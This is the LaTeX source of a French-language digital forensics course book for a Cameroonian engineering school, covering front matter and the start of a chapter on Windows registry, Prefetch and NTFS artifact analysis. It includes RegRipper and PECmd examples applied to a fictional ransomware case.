% ============================================================================
% Fichier     : INA_main.tex
% Titre       : Investigation Numérique Avancée
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Institution : Université de Yaoundé I - ENSP / LIMSI
% Unité d'Enseignement: SEC4052
% ============================================================================

\documentclass[12pt, twoside, openright, a4paper]{book}

% --- Feuille de style unifiée ---
\usepackage{Style_IN}
\raggedbottom

% --- Bibliographie ---
\addbibresource{bibliographie/TPIN_references.bib}

% ============================================================================
% MÉTADONNÉES PDF
% ============================================================================
\hypersetup{
    pdftitle={Investigation Numérique Avancée},
    pdfauthor={MINKA MI NGUIDJOÏ Thierry Emmanuel},
    pdfsubject={SEC4052 - Génie Informatique - Humanité Numérique - ENSP- UYI},
    pdfkeywords={investigation numérique, forensique, Trilemme CRO, ZK-NR,
                 cryptographie post-quantique, droit camerounais, TPIN}
}

% ============================================================================
% DÉBUT DU DOCUMENT
% ============================================================================
\begin{document}

% --------------------------------------------------------------------------
% ÉLÉMENTS PRÉLIMINAIRES (pages romaines)
% --------------------------------------------------------------------------
\frontmatter

    % ==============================================================================
% Fichier : front/00_page_titre.tex
% Titre   : Page de titre - Investigation Numérique Avancée (INA)
% Auteur  : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version : 2.1 -- novembre 2026 (charte des cours de l'ENSPY)
% ==============================================================================

\begin{titlepage}
\thispagestyle{empty}

% --- Fond décoratif, en-tête institutionnel et logos ---
\begin{tikzpicture}[remember picture, overlay]
    \fill[CouleurPrimaire]
        (current page.north west) rectangle
        ([yshift=-3.6cm] current page.north east);
    \fill[CouleurAccent]
        ([yshift=-3.6cm] current page.north west) rectangle
        ([yshift=-4.0cm] current page.north east);
    \fill[CouleurPrimaire]
        (current page.south west) rectangle
        ([yshift=2.5cm] current page.south east);
    \fill[CouleurAccent]
        ([yshift=2.5cm] current page.south west) rectangle
        ([yshift=2.9cm] current page.south east);
    \node[align=center, text=white] at ([yshift=-1.8cm] current page.north) {%
        {\fontsize{11}{13}\selectfont
        \textsc{République du Cameroun}}\\[0.3ex]
        {\color{CouleurAccent!60!white}\rule{0.4\paperwidth}{0.4pt}}\\[0.6ex]
        {\fontsize{10}{12}\selectfont\textbf{Université de Yaoundé I}}\\[0.2ex]
        {\fontsize{9}{11}\selectfont École Nationale Supérieure Polytechnique}\\[0.2ex]
        {\fontsize{9}{11}\selectfont Département de Génie Informatique - LIMSI}};
    % Logos : Université de Yaoundé I à gauche, ENSPY à droite (cours de l'ENSPY)
    \node[fill=white, rounded corners=4pt, inner sep=2pt]
        at ([xshift=1.75cm, yshift=-1.8cm] current page.north west)
        {\includegraphics[height=2.6cm]{figures/logos/uy1_logo.png}};
    \node[fill=white, rounded corners=4pt, inner sep=2pt]
        at ([xshift=-1.75cm, yshift=-1.8cm] current page.north east)
        {\includegraphics[height=2.6cm]{figures/logos/enspy_logo.jpg}};
    \node[align=center] at ([yshift=1.25cm] current page.south) {%
        {\color{white}\bfseries\large Année académique \anneescolaire}\\[0.3ex]
        {\color{CouleurAccent!70!white}\small
        Version 2.1 | Document pédagogique de l'UE \codeUE}};
\end{tikzpicture}

\vspace*{0.6cm}

% --- Titre principal ---
\begin{center}
    {\color{CouleurPrimaire}\rule{0.85\textwidth}{1.2pt}}\\[1.2ex]
    {\fontsize{26}{32}\selectfont\bfseries\color{CouleurPrimaire}
        Investigation\\[0.4ex]
        Numérique Avancée}\\[0.8ex]
    {\color{CouleurAccent}\rule{0.85\textwidth}{2pt}}\\[0.5ex]
    {\color{CouleurPrimaire}\rule{0.85\textwidth}{0.5pt}}
\end{center}

\vspace{0.6cm}

\begin{center}
    {\fontsize{13}{16}\selectfont\itshape\color{CouleurSecondaire}
        Forensique opérationnelle, anti-forensique\\
        et fondements cryptographiques de la preuve}
\end{center}

\vspace{0.4cm}

\begin{center}
    \begin{tikzpicture}
        \node[draw=CouleurPrimaire, fill=CouleurPrimaire, rounded corners=6pt,
              inner xsep=14pt, inner ysep=6pt]{%
            \color{white}\bfseries\large \sigleCours{} - UE~\codeUE
        };
    \end{tikzpicture}
\end{center}

\vspace{0.9cm}

% --- Illustration : le processus de l'investigation numérique ---
\begin{center}
\begin{tikzpicture}[
    node distance = 1.0cm and 1.3cm,
    box/.style = {
        draw=CouleurBordDef, fill=CouleurDef, rounded corners=4pt,
        minimum width=2.3cm, minimum height=0.7cm,
        font=\small\bfseries\color{CouleurPrimaire},
        inner sep=4pt, align=center
    },
    arrow/.style = {-{Stealth[length=5pt]}, thick, color=CouleurSecondaire}
]
\node[box] (id)   {Système};
\node[box, right=of id]  (pres)  {Réseau};
\node[box, right=of pres](acq)   {Mobile\\et nuage};
\node[box, below=0.6cm of acq]  (anal)  {IoT\\et OSINT};
\node[box, left=of anal]        (pres2) {Anti-\\forensique};
\node[box, left=of pres2]       (chain) {Preuve\\ZK-NR};
\draw[arrow] (id)    -- (pres);
\draw[arrow] (pres)  -- (acq);
\draw[arrow] (acq)   -- (anal);
\draw[arrow] (anal)  -- (pres2);
\draw[arrow] (pres2) -- (chain);
\end{tikzpicture}
\end{center}

\vspace{0.9cm}

\begin{center}
    {\large\bfseries\color{CouleurPrimaire}
        \auteurcours}\\[0.5ex]
    {\normalsize\color{CouleurSecondaire}
       Enseignant Chercheur | LIMSI | ENSPY}\\[0.2ex]
    {\small\color{CouleurBordInfo}
        \href{mailto:maletyon@proton.me}{maletyon@proton.me}}
\end{center}

\end{titlepage}

    \cleardoublepage

    % ==============================================================================
% Fichier : front/01_avant_propos.tex
% Titre   : Avant-propos - TPIN
% ==============================================================================

\chapter*{Avant-propos}
\addcontentsline{toc}{chapter}{Avant-propos}
\markboth{Avant-propos}{Avant-propos}

\epigraph{%
    « La technique n'est jamais seulement technique.
    Elle redéfinit l'humain et son rapport au monde. »%
}{Bernard Stiegler}

\vspace{0.5ex}

Ce cours est né d'une double conviction : que l'\termecle{investigation numérique}
constitue aujourd'hui l'une des disciplines les plus stratégiques pour le continent
africain, et que l'Afrique n'a pas à importer une vision de cette discipline, elle
doit en construire une qui lui soit propre, ancrée dans ses réalités juridiques, ses
enjeux économiques et ses capacités institutionnelles.

\bigskip

\textbf{Ce que ce cours n'est pas.} Il ne s'agit pas d'un catalogue d'outils, ni
d'une traduction d'un syllabus occidental. Les ouvrages de référence en langue
anglaise (Casey, Carrier, Carrier, Ligh) font un travail remarquable pour leurs
contextes. Ce cours assume pleinement un ancrage africain et, plus précisément,
camerounais : la Loi~2010/012, le rôle de l'\sigle{ANTIC}, la jurisprudence
naissante des tribunaux, les fraudes \sigle{MoMo},
le \sigle{SIM swapping} en zone \sigle{CEMAC}, voilà les matières premières
de l'investigateur numérique camerounais.

\bigskip

\textbf{Ce que ce cours est.} Le second volume, en trois parties (IV à VI), d'un
traité qui en compte sept (le premier volume est l'UE SEC4031). Il progresse de la
philosophie vers la pratique, de la règle de droit vers l'outil technique, du cas
simple vers la preuve post-quantique. Chaque chapitre comporte des objectifs
mesurables, des exercices gradués, des cas opérationnels ancrés dans la réalité
locale, et une analyse systématique à travers le prisme du \termecle{Trilemme CRO}, cadre théorique original que les travaux de notre équipe au \sigle{LIMSI} ont
formalisé en 2025.

\bigskip

\textbf{Le fil rouge : le Trilemme CRO.} Tout au long de cet ouvrage, vous
rencontrerez l'encadré $\Gamma_{CRO}$ qui interroge systématiquement chaque
technique, chaque protocole, chaque artefact sous trois dimensions :
\begin{itemize}
    \item \textbf{Confidentialité} ($\mathcal{C}$) : la technique protège-t-elle
          les données sensibles des parties impliquées ?
    \item \textbf{Fiabilité} ($\mathcal{R}$) : le résultat est-il intègre,
          reproductible, non altéré ?
    \item \textbf{Opposabilité juridique} ($\mathcal{O}$) : la preuve produite
          sera-t-elle recevable devant un tribunal ?
\end{itemize}
Le Trilemme établit qu'on ne peut pas maximiser simultanément ces trois dimensions.
Comprendre ce compromis, c'est comprendre l'essence même de l'investigation
numérique.

\textbf{Comment utiliser ce cours.} Chaque chapitre s'ouvre sur une \emph{boîte
objectifs} précisant les compétences attendues, et se ferme sur une \emph{boîte
résumé}. Les exercices sont gradués en trois niveaux : \niveaubase\ fondamental,
\niveaumoyen\ intermédiaire, \niveauexpert\ expert. Les codes sources sont testés
et fonctionnels sous Linux (Ubuntu 22.04+) et Windows 10/11.

\bigskip

\begin{flushright}
    \textit{\auteurcours}\\
    \textit{Yaoundé, juin 2026}
\end{flushright}

    \cleardoublepage

    % ==============================================================================
% Fichier : front/02_mode_emploi.tex
% Titre   : Mode d'emploi — TPIN
% ==============================================================================

\chapter*{Mode d'emploi de ce cours}
\addcontentsline{toc}{chapter}{Mode d'emploi}
\markboth{Mode d'emploi}{Mode d'emploi}

\section*{Structure générale}

Ce livre correspond à l'UE \textbf{SEC4052}. Il couvre les \textbf{parties IV à VI}
(chapitres 14 à 32)~: forensique opérationnelle, anti-forensique et défis
émergents, crypto-forensique. Il suppose acquis le prologue et les parties I
à III (chapitres 1 à 13), enseignés dans l'UE SEC4031, \emph{Introduction à
l'Investigation Numérique}~; le tableau ci-dessous rappelle l'ensemble du
parcours.

\begin{tableaucours}{lp{3.8cm}p{3.8cm}c}{%
    \tableauHeader{Partie} &
    \tableauHeader{Thème} &
    \tableauHeader{Compétences visées} &
    \tableauHeader{Niveau}
}
0 & Prologue opérationnel & Appréhender la réalité du terrain & \niveaubase \\
I & Fondements épistémologiques et historiques & Comprendre l'origine et les bases théoriques & \niveaubase \\
II & Processus et méthodologies & Conduire une investigation structurée & \niveaubase\,--\,\niveaumoyen \\
III & Cadre normatif et judiciaire & Opérer dans la légalité & \niveaubase \\
IV & Forensique opérationnelle & Analyser système, réseau, mobile, cloud & \niveaumoyen\,--\,\niveauexpert \\
V & Anti-forensique et défis émergents & Contrer les techniques d'occultation & \niveauexpert \\
VI & Crypto-forensique et contributions & Maîtriser les fondements post-quantiques & \niveauexpert \\
\end{tableaucours}

\section*{Les environnements visuels}

\begin{boxdef}
\textbf{Définition}. Introduit un terme technique avec sa définition formelle.
Tous les termes définis sont indexés en fin d'ouvrage.
\end{boxdef}

\begin{boxobjectifs}
Objectifs du chapitre. Liste les compétences mesurables attendues à l'issue
du chapitre. Ces objectifs correspondent aux critères d'évaluation.
\end{boxobjectifs}

\begin{boxCRO}
Analyse CRO. Évalue systématiquement une technique ou un protocole selon
les trois dimensions du Trilemme : Confidentialité~($\mathcal{C}$),
Fiabilité~($\mathcal{R}$), Opposabilité~($\mathcal{O}$).
\end{boxCRO}

\begin{boxscenario}{Titre du scénario}
Scénario opérationnel. Présente un cas réel ou fictif ancré dans la réalité
camerounaise ou africaine. Le cas MBONGO (fraude financière 12M~FCFA) sert
de fil rouge depuis l'UE SEC4031 et reparaît dans la Partie~IV.
\end{boxscenario}

\begin{boxPNC}
Application OPJ/DGSN. Traduit le concept académique en procédure opérationnelle
destinée aux Officiers de Police Judiciaire.
\end{boxPNC}

\begin{boxcustody}
Chaîne de Custody. Détaille les étapes et formulaires nécessaires à la
préservation de la valeur probante d'une preuve numérique.
\end{boxcustody}

\begin{boxartefact}{Nom de l'artefact}
Artefact forensique. Décrit un artefact numérique spécifique : sa localisation
sur le système, la valeur qu'il porte pour l'investigation, et sa fragilité.
\end{boxartefact}

\begin{boxjuris}
Jurisprudence \& Droit applicable. Référence les textes de loi, articles et
jurisprudences pertinents, avec accent sur le droit camerounais et africain.
\end{boxjuris}

\begin{boxalert}
Attention. signale un risque procédural, légal ou technique pouvant
invalider une investigation.
\end{boxalert}

\begin{boxresume}
À retenir. Synthèse des points essentiels du chapitre.
\end{boxresume}

\begin{boxexo}
Exercice. Travaux pratiques gradués. Chaque exercice porte un indicateur
de niveau : \niveaubase\ fondamental, \niveaumoyen\ intermédiaire,
\niveauexpert\ expert.
\end{boxexo}

\section*{Conventions typographiques}

\begin{itemize}
    \item Les \termecle{termes clés} apparaissent en \textbf{gras bleu marine}
          et sont indexés automatiquement.
    \item Les \sigle{ACRONYMES} utilisent des petites capitales.
    \item Les références aux normes utilisent la commande \norme{ISO/IEC~27037}.
    \item Les références aux lois camerounaises utilisent \loicam{2010/012}.
    \item Les hachages cryptographiques sont formatés ainsi :
          \hash{SHA-256}{\texttt{3a4b5c6d...}}.
    \item L'impact CRO inline est noté : \cro{+0.8}{-0.3}{+0.6}.
    \item L'ordre de volatilité est indiqué : \volatilite{1}{RAM}.
\end{itemize}

\section*{Matériel d'accompagnement}

Ce cours est complété par :
\begin{itemize}
    \item \textbf{Images de pratique forensique}, images E01 préparées pour
          les TP Autopsy.
    \item \textbf{Captures réseau (.pcap)}, traces Wireshark pour les TP
          de forensique réseau.
    \item \textbf{Machines virtuelles}, VM Kali Linux et VM Windows avec
          artefacts préinstallés (clé USB fournie en TP).
    \item \textbf{Formulaires officiels}, formulaire de chaîne de custody
          (Annexe~C), adapté du formulaire type DGSN.
\end{itemize}

    \cleardoublepage
    % ==============================================================================
% Fichier : front/03_ndap_sukulu.tex
% Titre   : NDAP SUKULU, l'environnement compagnon du cours
% Auteur  : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version : 1.0 -- novembre 2026
% ==============================================================================
% Texte commun aux cours de l'auteur ; seul le tableau des labs est propre au
% cours (fichier front/03b_labs.tex).
% ==============================================================================

\chapter*{NDAP SUKULU, la salle de classe compagnon}
\addcontentsline{toc}{chapter}{NDAP SUKULU, la salle de classe compagnon}
\markboth{NDAP SUKULU}{NDAP SUKULU}

\begin{center}
    \includegraphics[width=0.62\textwidth]{figures/logos/logo_ndap_sukulu.png}
\end{center}

\section*{Un nom venu du pays bassa}

\begin{quote}\itshape
Le soir tombe sur Éséka. Un enfant revient des champs avec son grand-père et
lui demande pourquoi il doit marcher si loin, chaque matin, pour aller à
l'école. Le vieil homme s'arrête au bord du chemin et répond, en bassa~:
« \textup{Ndap sukulu}, la salle de classe, ce ne sont pas les murs. Ce sont
les murs qui viennent après. La salle de classe, c'est l'endroit où quelqu'un
t'attend pour t'apprendre ce qu'il sait. » L'enfant insiste~: « Et qui
m'attend~? » Le grand-père sourit~: « \textup{Malet yon}. Ton enseignant. »
\end{quote}

En bassa, la langue paternelle de l'auteur, \textbf{\textit{ndap sukulu}}
désigne la salle de classe et \textbf{\textit{malet yon}} signifie « ton
enseignant ». L'environnement compagnon de ce cours porte ce nom parce qu'il
prolonge la salle de classe au-delà des heures de cours~: il attend
l'étudiant le soir, le week-end, à distance, avec des questions, des pièces à
examiner et une correction immédiate. Il est édité par \textbf{MaletYon},
« ton enseignant », et mis à la disposition des étudiants et des praticiens
qui souhaitent se perfectionner (\href{mailto:maletyon@proton.me}{maletyon@proton.me}).

\section*{Ce que l'on y trouve}

\begin{itemize}
    \item \textbf{Une fiche d'auto-évaluation par chapitre.} Chaque fiche
          puise vingt questions dans une banque de quarante (QCM, vrai ou
          faux, textes à trous). Elle dure trente minutes~; la copie validée
          est verrouillée et notée aussitôt. Le seuil de réussite est de
          60~\%.
    \item \textbf{Des laboratoires pratiques.} Chaque lab place l'étudiant
          devant les pièces d'une affaire du fil rouge (tableurs, journaux,
          contrats, procès-verbaux) dans un bureau d'analyste virtuel,
          ouvert dans le navigateur. Il dure soixante minutes, se termine
          par des points de contrôle notés automatiquement et renvoie aux
          sections du livre qu'il mobilise.
    \item \textbf{Un suivi pour l'enseignant}~: rapport de classe, notes par
          fiche et par lab, journal d'activité.
\end{itemize}

Les fiches et les labs sont des travaux à faire hors des heures de cours.
Ils ne remplacent ni le livre ni les exercices de fin de chapitre~: ils en
vérifient la maîtrise.

\section*{Comment y travailler}

\begin{enumerate}
    \item Se connecter au portail NDAP SUKULU avec ses identifiants et le
          code de cours \textbf{\codeUE}.
    \item Pour un lab, commencer par vérifier l'empreinte SHA-256 des pièces
          (\texttt{sha256sum -c MANIFESTE\_SHA256.txt}), puis travailler sur
          la copie du dossier \texttt{travail}~: les pièces originales sont
          en lecture seule et l'activité est journalisée, comme dans une
          vraie mission.
    \item Lire le rappel de cours affiché par le lab et relire les sections
          citées avant de répondre.
\end{enumerate}

\begin{boxinfo}
\textbf{Si le portail n'est pas encore ouvert.} En attendant le déploiement
de NDAP SUKULU, les fiches de questions sont fournies au format texte dans le
dossier \texttt{fiches} du cours, prêtes à être distribuées. Les corrections
des fiches figurent dans le livret de correction, à la suite des corrigés des
exercices de chaque chapitre.
\end{boxinfo}

\section*{Les laboratoires du cours}

% Tableau des labs du cours INA dans NDAP SUKULU (propre au cours).
Le cours compte douze laboratoires, disponibles sous le code \codeUE. Les
onze premiers durent une heure et suivent l'ordre des chapitres~; le
douzième, le plus long et le plus détaillé, résume tout le cours~: il
couvre les études de cas intégratrices (chapitre~21), le benchmarking
(chapitre~25) et les fondements cryptographiques de la preuve (Partie~VI).

\begin{tableaucours}{lp{6.4cm}p{1.6cm}p{2.2cm}}{%
    \tableauHeader{Lab} &
    \tableauHeader{Sujet} &
    \tableauHeader{Chapitre} &
    \tableauHeader{Opération}
}
INA-LAB-01 & Forensique système~: timeline Linux et Windows & 14 & MVOM \\
INA-LAB-02 & Forensique réseau opérationnelle~: beaconing et courriel frauduleux & 15 & BAOBAB, NKAM \\
INA-LAB-03 & Journaux réseau sans capture~: DNS, proxy, pare-feu & 15 & MVOM \\
INA-LAB-04 & Forensique mobile~: SMS, appels, EXIF & 16 & BAOBAB, MBONGO \\
INA-LAB-05 & Forensique cloud~: CloudTrail et fenêtre aveugle & 17 & MVOM \\
INA-LAB-06 & Forensique IoT~: firmware de routeur et NVR & 18 & NYONG \\
INA-LAB-07 & OSINT~: domaines, profils, cryptoactifs & 19 & BAOBAB \\
INA-LAB-08 & Le rapport forensique~: relecture avant dépôt & 20 & MVOM \\
INA-LAB-09 & Anti-forensique~: timestomping et journaux effacés & 22 & MVOM \\
INA-LAB-10 & L'IA en forensique~: mesurer un outil, examiner des clips & 23 & MUNGO \\
INA-LAB-11 & Conteneurs~: audit Kubernetes et conteneur évincé & 24 & MVOM \\
INA-LAB-12 & Synthèse~: du dossier intégrateur à la preuve vérifiable (lab long) & 21, 25, 26--32 & Toutes \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Les laboratoires du cours dans NDAP SUKULU}\end{center}


    \cleardoublepage

    \tableofcontents
    \cleardoublepage

    \listoffigures
    \listoftables
    \cleardoublepage

% --------------------------------------------------------------------------
% CORPS DU COURS (pages arabes)
% --------------------------------------------------------------------------
\mainmatter

    % Suite de l'UE SEC4031 : la numérotation des parties (IV à VI)
    % et des chapitres (14 à 32) est celle des fichiers du cours d'origine.
    \setcounter{part}{3}
    \setcounter{chapter}{13}

    % ======================================================================
    % PARTIE IV - FORENSIQUE OPÉRATIONNELLE
    % Standards : SANS FOR508/FOR610, NIST SP 800-86/101, SWGDE
    % Niveau : intermédiaire à expert
    % ======================================================================
    \part{Forensique Opérationnelle}
    \label{part:forensique}

        % ============================================================================
% Fichier  : partie4/P04_C14_forensique_systeme.tex
% Titre    : Forensique Système Avancée
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% ============================================================================

\chapter{Forensique Système Avancée}
\label{chap:for-sys}

\epigraph{%
    « Les systèmes d'exploitation sont les témoins silencieux de nos
    actions numériques. Savoir les interroger, c'est maîtriser l'art
    de faire parler le silence. »%
}{Thierry Minka}

\niveauChapitre{Expert}{%
    Maîtrise des Chapitres~6~(UE~SEC4031) à~9~(UE~SEC4031) (Partie~II)
    indispensable. Notions de systèmes d'exploitation Windows et Linux
    (systèmes de fichiers, registre, processus) requises.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Analyser les artefacts Windows post-acquisition~: registre,
          Prefetch, ShimCache, Amcache, journal \texttt{\$MFT}.
    \item Reconstruire une timeline d'activité système à partir de
          sources hétérogènes (logs, métadonnées de fichiers, registre).
    \item Analyser les artefacts Linux~: journaux \texttt{systemd},
          historique bash, structures \texttt{ext4} et inodes.
    \item Distinguer ce qui survit à une suppression de fichier de ce
          qui disparaît, et comprendre pourquoi (Locard numérique).
    \item Appliquer la distinction Examination/Analysis (NIST~SP~800-86~\cite{nist80086})
          à l'analyse système.
    \item Construire une timeline forensique avec Autopsy/log2timeline
          et l'interpréter dans le respect du principe de falsification
          (E9bis PIU).
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Ce chapitre dans la séquence du cours}
% ============================================================================

Le Chapitre~9~(UE~SEC4031) vous a appris à \textbf{acquérir}~: créer
une image E01, capturer la RAM, extraire un téléphone. Ce chapitre vous
apprend à \textbf{analyser} ce que vous avez acquis. La question change~:
non plus ``comment obtenir des données sans les altérer'', mais
``que disent ces données, et comment le prouver''.

\separateur

% ============================================================================
\section{Le Principe de Locard Appliqué au Système}
\label{sec:locard-systeme}
% ============================================================================

Le principe de Locard~\cite{locard1920} (Chapitre~4~(UE~SEC4031)) ``tout contact
laisse une trace'', se traduit, dans un système d'exploitation, par
une multiplication d'artefacts redondants. Une seule action utilisateur
laisse souvent \textbf{cinq à dix traces indépendantes}, dans des
emplacements différents, avec des granularités temporelles différentes.

\begin{boxdef}
\textbf{Redondance forensique}\index{redondance forensique}~: propriété
selon laquelle une même action système produit plusieurs artefacts
indépendants. La redondance est la meilleure amie de l'investigateur~:
si un artefact est supprimé ou falsifié, les autres subsistent et
révèlent l'incohérence.
\end{boxdef}

\textbf{Exemple~: exécution d'un fichier \texttt{malware.exe} sur Windows}~:

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Artefact} &
    \tableauHeader{Information capturée} &
    \tableauHeader{Survit à la suppression du fichier~?}
}
Prefetch (\texttt{.pf}) & Nom, chemin, nombre d'exécutions, dernière
    exécution, fichiers chargés &
    \textbf{Oui}. fichier séparé dans \texttt{C:\textbackslash Windows\textbackslash Prefetch} \\
ShimCache (AppCompatCache) & Chemin, taille, horodatage de dernière
    modification, présence d'exécution &
    \textbf{Oui}. clé de registre, persiste après suppression \\
Amcache.hve & Hash SHA-1 du binaire, chemin, premier horodatage
    d'exécution &
    \textbf{Oui}. ruche de registre séparée \\
\texttt{\$MFT} (NTFS) & Métadonnées du fichier~: création, modification,
    accès, taille &
    \textbf{Partiellement}. l'entrée MFT peut être réutilisée
    mais le \texttt{\$LogFile} en garde trace \\
Journal des événements
    (Event~ID~4688) & Création de processus, utilisateur, ligne
    de commande &
    \textbf{Oui}. fichier \texttt{.evtx} séparé \\
USN Journal (\texttt{\$UsnJrnl}) & Historique des modifications du
    volume (création, suppression, renommage) &
    \textbf{Oui}. journal continu, rotation sur volume \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.1. Redondance forensique~:
6~artefacts pour une seule exécution}\end{center}

\begin{boxCRO}
\textbf{Analyse CRO. Redondance et opposabilité}

$\mathcal{R}$ (Fiabilité)~: la convergence de 6~artefacts indépendants
vers la même conclusion (``\texttt{malware.exe} a été exécuté le
13/03/2026 à 02h17'') constitue une preuve bien plus robuste qu'un
seul artefact, même solide.

$\mathcal{O}$ (Opposabilité)~: un avocat peut contester un artefact
isolé (``ce Prefetch pourrait dater d'un test antérieur''). Il ne
peut pas contester la convergence de 6~sources indépendantes sans
expliquer comment elles ont \emph{toutes} été falsifiées de façon
cohérente ce qui est techniquement très difficile.

\cro{$\sim$}{$\uparrow\uparrow$ convergence multi-sources}{$\uparrow\uparrow$ incontestable en pratique}

\textbf{Règle pratique~:} ne jamais conclure sur la base d'un seul
artefact si d'autres sont accessibles. Documenter systématiquement
la convergence (ou la divergence, qui est elle-même une information).
\end{boxCRO}

% ============================================================================
\section{Artefacts Windows~: Registre et Exécution de Programmes}
\label{sec:artefacts-windows}
% ============================================================================

\subsection{Les ruches de registre essentielles}

Le \termecle{registre Windows}\index{registre Windows} est une base de
données hiérarchique stockant la configuration du système et des
applications. Cinq ruches sont systématiquement analysées en forensique~:

\begin{tableaucours}{p{2.5cm}p{3.0cm}p{6.0cm}}{%
    \tableauHeader{Ruche} &
    \tableauHeader{Emplacement disque} &
    \tableauHeader{Contenu forensique}
}
\texttt{SYSTEM} & \texttt{C:\textbackslash Windows\textbackslash System32\textbackslash config} &
    Configuration système, services, périphériques USB connectés
    (\texttt{USBSTOR}), fuseau horaire \\
\texttt{SOFTWARE} & idem &
    Applications installées, versions, ShimCache (AppCompatCache) \\
\texttt{SAM} & idem &
    Comptes utilisateurs locaux, hash NTLM, dernière connexion \\
\texttt{NTUSER.DAT} & \texttt{C:\textbackslash Users\textbackslash <user>} &
    Historique d'exécution (\texttt{RunMRU}), fichiers récents
    (\texttt{RecentDocs}), répertoires tapés (\texttt{TypedPaths}) \\
\texttt{Amcache.hve} & \texttt{C:\textbackslash Windows\textbackslash AppCompat\textbackslash Programs} &
    Inventaire d'applications exécutées avec hash SHA-1 \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~14.2. Ruches de registre essentielles}\end{center}

\subsection{Extraction et analyse avec RegRipper}

\begin{boxoutils}{RegRipper, extraction des ruches de registre}
\begin{lstlisting}[language=bash_forensique]
# Extraire les ruches depuis l'image montee (lecture seule)
# Image montee sous /mnt/evidence/

# Lister les programmes installes
rip.pl -r /mnt/evidence/Windows/System32/config/SOFTWARE
    -p installedsoftware

# Historique des executions via UserAssist (NTUSER.DAT)
rip.pl -r /mnt/evidence/Users/MBONGO/NTUSER.DAT -p userassist
# Resultat type :
# \Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist
#   {chemin}\enc_all.ps1  -- Run Count: 1
#   LastExecuted: 2026-03-13 02:17:42

# Peripheriques USB connectes (historique complet)
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p usbstor
# Resultat type :
# DeviceClass: Disk
# FriendlyName: Kingston DataTraveler 16GB
# Serial: 0123456789ABCDEF
# FirstConnect: 2026-03-10 09:15:22
# LastConnect: 2026-03-13 02:05:11

# ShimCache (AppCompatCache) -- preuve d'execution
rip.pl -r /mnt/evidence/Windows/System32/config/SYSTEM -p shimcache
# Resultat type :
# Path: C:\Users\admin\AppData\Local\Temp\enc_all.ps1
# Last Modified: 2026-03-13 02:16:58
# Executed: TRUE
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution UserAssist, cas MVOM}
Dans l'Opération MVOM (Chapitre~3~(UE~SEC4031)), l'analyse
UserAssist de la ruche \texttt{NTUSER.DAT} de l'administrateur
TRANSBOIS révèle~:

\begin{lstlisting}[language=bash_forensique]
UserAssist Key: {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}
  powershell.exe          Run Count: 1   Last: 2026-03-13 02:17:40
  cmd.exe                 Run Count: 1   Last: 2026-03-13 02:17:42
  AnyDesk.exe             Run Count: 3   Last: 2026-03-13 02:10:15
\end{lstlisting}

\textbf{Constatation (sans interprétation)~:} L'application
\texttt{AnyDesk.exe} (logiciel de bureau à distance) a été exécutée
3~fois, la dernière à 02h10. \texttt{cmd.exe} a été exécuté à 02h17.
L'ordre chronologique place l'établissement d'un accès distant
\emph{avant} l'exécution des commandes suspectes.\\[0.3ex]
Cette constatation, croisée avec \texttt{windows.netscan} (Volatility,
Ch.~9~(UE~SEC4031)) qui montre une connexion \texttt{ESTABLISHED} vers
le port~4444 à 02h17, \textbf{converge} vers une chronologie cohérente~:
accès distant établi~$\to$ ouverture d'un shell~$\to$ déploiement
du ransomware.
\end{boxscenario}

\subsection{Le Prefetch~: preuve d'exécution même sans logs}

Le \termecle{Prefetch}\index{Prefetch} est un mécanisme d'optimisation
Windows qui enregistre, pour chaque exécutable lancé, un fichier
\texttt{.pf} dans \texttt{C:\textbackslash Windows\textbackslash Prefetch}.
Ces fichiers survivent souvent à la suppression de l'exécutable lui-même.

\begin{boxoutils}{Analyse Prefetch avec PECmd}
\begin{lstlisting}[language=bash_forensique]
# PECmd (Eric Zimmerman tools) -- analyse complete du repertoire Prefetch
PECmd.exe -d /mnt/evidence/Windows/Prefetch --csv ./output/

# Resultat (extrait CSV) :
# SourceFilename       : ENC_ALL.PS1-3F8A2B91.pf
# ExecutableName       : enc_all.ps1
# RunCount             : 1
# LastRun              : 2026-03-13 02:17:44
# Volume0Created       : 2024-01-15 10:00:00
# FilesAccessed        : C:\Windows\System32\WindowsPowerShell\...
#                        C:\Users\admin\AppData\Local\Temp\enc_all.ps1
#                        C:\Users\Public\Documents\encrypted_files_list.txt
\end{lstlisting}
\textbf{Valeur forensique~:} même si \texttt{enc\_all.ps1} a été supprimé
par l'attaquant après exécution, le fichier Prefetch
\texttt{ENC\_ALL.PS1-3F8A2B91.pf} subsiste et révèle~: le nom exact du
script, son horodatage d'exécution (02h17:44, cohérent avec UserAssist
et Volatility), et la liste des fichiers accédés y compris
\texttt{encrypted\_files\_list.txt}, preuve directe de l'activité ransomware.
\end{boxoutils}

% ============================================================================
\section{Le Système de Fichiers NTFS~: \texttt{\$MFT} et \texttt{\$UsnJrnl}}
\label{sec:ntfs}
% ============================================================================

\subsection{La Master File Table}

La \termecle{\$MFT}\index{\$MFT} (\textit{Master File Table}) est la
structure centrale de NTFS~: chaque fichier et répertoire y possède une
entrée de 1024~octets contenant ses métadonnées. Quatre horodatages
(\textbf{MACE}) sont enregistrés pour chaque fichier~:

\begin{tableaucours}{p{2.0cm}p{3.0cm}p{6.5cm}}{%
    \tableauHeader{Timestamp} &
    \tableauHeader{Signification} &
    \tableauHeader{Piège forensique fréquent}
}
\textbf{M}. Modified & Dernière modification du contenu &
    Modifié par toute écriture, même mineure~; ne reflète pas
    la création \\
\textbf{A}. Accessed & Dernier accès en lecture &
    \textbf{Souvent désactivé} depuis Windows~Vista
    (\texttt{NtfsDisableLastAccessUpdate=1})~; ne pas s'y fier
    sans vérification \\
\textbf{C}. Changed (MFT) & Dernière modification de
    l'\emph{entrée MFT} elle-même (métadonnées, permissions) &
